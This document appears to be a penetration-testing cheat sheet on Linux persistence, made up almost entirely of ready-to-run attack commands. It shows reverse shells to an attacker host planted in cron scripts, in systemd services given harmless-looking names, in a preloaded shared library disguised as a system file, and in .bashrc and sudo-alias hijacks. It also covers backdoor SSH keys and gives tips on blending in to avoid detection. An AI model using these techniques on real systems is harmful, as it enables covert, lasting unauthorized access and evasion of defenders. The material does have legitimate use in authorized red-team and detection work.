# Linux Persistence

!!! tip "Stealthy vs quick"
    Cron (`* * * * * /tmp/.x`) is quick but obvious in `crontab -l`. For stealth, add to `/etc/cron.d/` with a blending name (`logrotate-extra`). SSH `authorized_keys` is most reliable — survives reboots and doesn't show in process listings.

---

## Cron Job Persistence

### Identify Writable Cron Jobs

```bash
ls -lah /etc/cron*
cat /etc/crontab
crontab -l
grep "CRON" /var/log/syslog
```

### Inject Reverse Shell into Writable Cron Job

```bash
echo "bash -i >& /dev/tcp/<attacker-ip>/4444 0>&1" >> /home/user/backup.sh
nc -lvnp 4444
```

---

## SSH Key Persistence

```bash
ssh-keygen -t rsa -b 4096 -f ~/.ssh/persistent_key
echo "ssh-rsa AAAAB3..." >> ~/.ssh/authorized_keys
ssh -i persistent_key <user>@10.10.10.10
```

---

## Systemd Service Persistence

1. Create a service file at `/etc/systemd/system/persistence.service`:

    ```
    [Unit]
    Description=Persistence Service
    After=multi-user.target

    [Service]
    Type=simple
    ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/<attacker-ip>/4444 0>&1'
    Restart=always
    RestartSec=60

    [Install]
    WantedBy=multi-user.target
    ```

2. Enable and start:

    ```bash
    systemctl enable persistence.service
    systemctl start persistence.service
    ```

---

## User-Level systemd Services (No Root Required)

```bash
mkdir -p ~/.config/systemd/user
cat > ~/.config/systemd/user/update-check.service <<'EOF'
[Unit]
Description=Update checker

[Service]
Type=simple
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/<attacker-ip>/4444 0>&1'
Restart=always

[Install]
WantedBy=default.target
EOF

systemctl --user enable --now update-check.service
# Survives logout if linger is enabled:
loginctl enable-linger $USER
```

---

## `/etc/ld.so.preload`

Every dynamically-linked binary (most of the system) loads libraries listed here at startup. Inject a shared object that runs on every command:

```bash
cat > /tmp/rk.c <<'EOF'
#include <stdio.h>
#include <stdlib.h>
__attribute__((constructor)) void init(){
    if(getuid()==0) system("bash -c 'bash -i >& /dev/tcp/<attacker-ip>/4444 0>&1 &'");
}
EOF
gcc -fPIC -shared -nostartfiles /tmp/rk.c -o /lib/x86_64-linux-gnu/libudev.so.9
echo /lib/x86_64-linux-gnu/libudev.so.9 > /etc/ld.so.preload
```

!!! warning "Watch out"
    `ld.so.preload` loads into *every* process — a broken library or crashing payload will brick the system. Test the .so in isolation first, and keep the payload wrapped in a UID check and a background fork to avoid stalling normal commands.

---

## SSH `authorized_keys` With `from=` Restriction

Lock the backdoor to your attacker IP so it blends better and doesn't grant random scanners access:

```bash
echo 'from="203.0.113.5" ssh-rsa AAAA...' >> /root/.ssh/authorized_keys
```

Also consider `command=`:

```bash
echo 'command="/bin/bash",from="203.0.113.5" ssh-rsa AAAA...' >> /root/.ssh/authorized_keys
```

---

## Shell RC File Hijack

```bash
# Runs every time the user starts an interactive shell
echo 'bash -c "bash -i >& /dev/tcp/<attacker-ip>/4444 0>&1" &' >> /root/.bashrc
```

Lower-footprint alternative — only fires when a specific command is run:

```bash
echo 'alias sudo="bash -c \"bash -i >& /dev/tcp/<attacker-ip>/4444 0>&1\" &; /usr/bin/sudo"' >> /root/.bashrc
```
